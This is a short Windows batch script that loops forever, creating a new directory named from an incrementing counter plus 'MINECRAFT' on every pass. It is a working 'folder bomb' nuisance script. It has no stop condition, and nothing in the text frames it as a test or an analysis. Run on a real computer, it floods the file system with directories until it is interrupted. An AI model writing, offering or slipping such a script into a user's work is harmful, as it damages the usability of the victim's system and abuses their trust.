@echo off
set  counter=0
:top
md %counter%+"MINECRAFT"
set /a counter+=1
goto top